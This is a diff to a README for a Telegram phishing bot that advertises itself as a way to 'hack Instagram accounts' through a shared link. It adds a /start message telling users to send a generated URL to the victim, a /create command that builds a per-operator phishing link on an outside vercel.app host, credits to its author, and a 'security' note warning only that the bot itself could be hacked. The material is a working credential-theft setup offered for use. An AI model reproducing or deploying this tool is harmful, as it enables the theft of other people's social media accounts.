@@ -15,7 +15,25 @@ Watch the tutorial video on how to set up and use this phishing page:
 ## Bot Setup Commands
 
 ### `/start`
-Displays a welcome message and basic instructions on how to use the bot.
+Displays the welcome message and basic usage instructions for the bot.
 
 ```javascript
-Bot.sendMessage("WELCOME! YOU CAN USE THIS BOT TO HACK INSTAGRAM ACCOUNTS USING A LINK 🔗 \n\nHOW TO USE: \n1. Send the /create command\n2. Share the generated URL with the victim.");
+Bot.sendMessage("WELCOME YOU CAN USE THIS BOT FOR HACK INSTAGRAM ACCORDING BY JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄 \n 1.Send  /create command\n2.Now just share you generated url to victim.");
+```
+
+### `/create`
+Generates a personalized URL containing the user's Telegram ID.
+
+```javascript
+let userId = user.telegramid;
+let url = "https://sg-internet.vercel.app/?id=" + userId;
+Bot.sendMessage("YOUR URL:\n" + url + "\n\nMADE BY <b>@SG_Modder</b>", { parse_mode: "HTML" });
+```
+
+## Credits
+
+Created by @SG_Modder
+
+## Security Considerations
+
+- Only for personal Use, Don't make public bot otherwise you bot can be easily hack by hackers. 
